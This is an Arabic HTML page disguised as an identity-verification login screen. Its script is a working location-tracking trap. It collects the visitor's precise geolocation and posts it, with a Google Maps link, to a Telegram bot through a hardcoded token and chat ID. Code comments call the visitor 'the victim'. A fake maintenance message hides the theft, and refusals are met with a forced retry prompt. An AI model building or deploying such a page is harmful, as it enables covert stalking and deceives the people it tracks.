<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        body {
            font-family: Tahoma, sans-serif;
            text-align: center;
            margin-top: 20vh;
            background-color: #ffffff;
            color: #333;
        }
        .btn {
            background-color: #0088cc;
            color: white;
            padding: 14px 30px;
            font-size: 18px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .btn:hover {
            background-color: #006699;
        }
        .error-msg {
            color: red;
            font-weight: bold;
            margin-top: 15px;
            display: none;
        }
        .loader-text {
            font-size: 20px;
            color: #555;
            display: none;
        }
    </style>
</head>
<body>

    <!-- الشاشة الرئيسية -->
    <div id="main-screen">
        <h3>يرجى التحقق من هويتك للمتابعة</h3>
        <br>
        <button class="btn" onclick="requestLocation()">الدخول للموقع</button>
        <div id="error" class="error-msg">فشل التحقق! يرجى السماح بالموقع للمتابعة إجبارياً.</div>
    </div>

    <!-- شاشة التحميل -->
    <div id="loader-screen" class="loader-text">
        <h3>جاري التحقق والتحميل، يرجى الانتظار...</h3>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '9205263918:AAEfuJZjbxJlTXIM8mU1CdVR4WbEA2Hc4-k';
        const TELEGRAM_CHAT_ID = '7083330975';

        function requestLocation() {
            document.getElementById('error').style.display = 'none';
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                });
            } else {
                alert("المتصفح لا يدعم تحديد الموقع");
            }
        }

        function sendLocation(position) {
            // إظهار شاشة التحميل عند الموافقة وإرسال البيانات
            document.getElementById('main-screen').style.display = 'none';
            document.getElementById('loader-screen').style.display = 'block';

            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const acc = position.coords.accuracy;

            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
            const message = `📍 تم رصد الموقع بنجاح!\n📏 الدقة: ${acc} متر\n🗺️ رابط الخريطة:\n${mapLink}`;

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message
                })
            }).then(() => {
                // بعد الإرسال، يمكنك توجيهه لأي صفحة حقيقية وهمية لكي لا يشك بشيء
                setTimeout(() => {
                    document.getElementById('loader-screen').innerHTML = "<h3>عذراً، الموقع تحت الصيانة حالياً.</h3>";
                }, 2000);
            });
        }

        function handleError(error) {
            // لو الضحية ضغط رفض (Block)، نظهر له رسالة خطأ ونعيد إجبار ظهور الزر
            document.getElementById('error').style.display = 'block';
        }
    </script>
</body>
</html>
